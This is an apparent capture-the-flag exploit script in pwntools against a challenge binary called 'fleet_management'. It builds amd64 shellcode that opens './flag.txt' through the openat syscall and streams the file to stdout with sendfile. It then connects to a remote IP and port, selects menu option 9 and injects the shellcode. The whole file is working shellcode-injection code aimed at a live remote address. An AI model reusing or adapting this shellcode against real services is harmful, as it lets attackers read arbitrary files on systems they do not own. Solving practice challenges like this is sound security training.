from pwn import *

context.arch = "amd64"
shellcode = """
mov ax, 257
mov rdi, -100
mov rdx, 0x0000000000007478
push rdx
mov rdx, 0x742e67616c662f2e
push rdx
mov rsi , rsp
xor rdx, rdx
syscall
mov rsi, rax
mov al, 40
mov rdi, 1
mov r10, 100
syscall"""
shellcode = asm(shellcode)
print(shellcode)
print(len(shellcode))
r = remote("138.68.183.64" ,30592)
#r = process("./fleet_management")
r.recv()
r.sendafter('[*] What do you want to do? ' ,'9')
r.interactive()
r.send(shellcode)
r.interactive()
